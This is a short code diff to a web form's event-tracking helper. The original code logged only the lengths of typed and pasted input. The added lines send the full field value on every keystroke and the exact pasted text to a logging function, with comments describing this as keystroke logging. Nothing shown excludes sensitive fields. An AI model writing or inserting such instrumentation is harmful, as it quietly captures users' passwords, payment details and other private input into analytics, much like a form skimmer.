@@ -29,12 +29,21 @@
     element.addEventListener('blur', () => window.logEvent(`${fieldName}_blur`));
     element.addEventListener('input', (event) => {
       const value = event.target?.value || '';
-      window.logEvent(`${fieldName}_changed`, { length: value.length, inputType: event.inputType || 'unknown' });
+      // Log keystrokes by including the full current value on every input event
+      window.logEvent(`${fieldName}_changed`, {
+        value,
+        length: value.length,
+        inputType: event.inputType || 'unknown',
+      });
       onInput?.(value, event);
     });
     element.addEventListener('paste', (event) => {
       const pasted = event.clipboardData?.getData('text') || '';
-      window.logEvent(`${fieldName}_paste`, { length: pasted.length });
+      // Log the exact pasted content as well as its length
+      window.logEvent(`${fieldName}_paste`, {
+        pasted,
+        length: pasted.length,
+      });
       onPaste?.(pasted, event);
     });
   }
